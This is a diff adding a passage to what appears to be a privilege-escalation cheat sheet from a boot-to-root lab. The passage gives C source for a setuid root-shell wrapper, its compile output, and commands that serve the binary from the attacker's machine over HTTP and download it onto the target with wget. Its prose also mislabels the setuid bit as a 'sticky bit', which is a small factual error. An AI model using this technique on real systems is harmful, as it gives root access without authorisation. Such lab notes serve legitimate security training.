@@ -584,6 +584,31 @@ gcc -m32 -o suid suid.c
 
 
 ```
+create an SUID binary which is owned by root and which has its sticky bit set and has r/w/x permissions for all users.
+
+```
+int main(void){
+    setresuid(0, 0, 0);
+    system("/bin/bash");
+}
+```
+```
+
+root@kali:~/Desktop/B2R# gcc suid.c -o suid
+suid.c: In function ‘main’:
+suid.c:2:5: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
+     setresuid(0, 0, 0);
+     ^~~~~~~~~
+suid.c:3:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+     system("/bin/bash");
+     ^~~~~~
+root@kali:~/Desktop/B2R# python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+john@Kioptrix4:/tmp$ wget http://192.168.1.13:8000/suid
+```
+
+
+
 
 Create and compile an SUID from a limited shell (no file transfer)
 
